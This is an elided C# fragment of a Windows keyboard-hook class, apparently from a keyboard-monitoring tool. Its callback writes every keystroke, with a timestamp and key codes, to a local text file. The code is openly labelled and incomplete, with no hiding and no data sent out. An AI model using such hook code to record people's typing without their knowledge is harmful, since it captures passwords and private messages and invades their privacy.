...
namespace MonitoringSystemKeyBoard
{
    /// <summary>
    /// 获取键盘按键
    /// </summary>
    ...
    public class InterceptKeys
    {
        ...
        private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            ...
            if (nCode >= 0)
            {
                ...
                //记录到日志
                System.IO.File.AppendAllText(@"d:\hot.txt", $"[{DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss fff")}][Code={vkCode}][{nCode}][wParam={wParam}]{key}{Environment.NewLine}");
                //if (key == Keys.LWin)
                //{
                //    return (IntPtr)1; // 屏蔽LWindow按键
                //}
            }
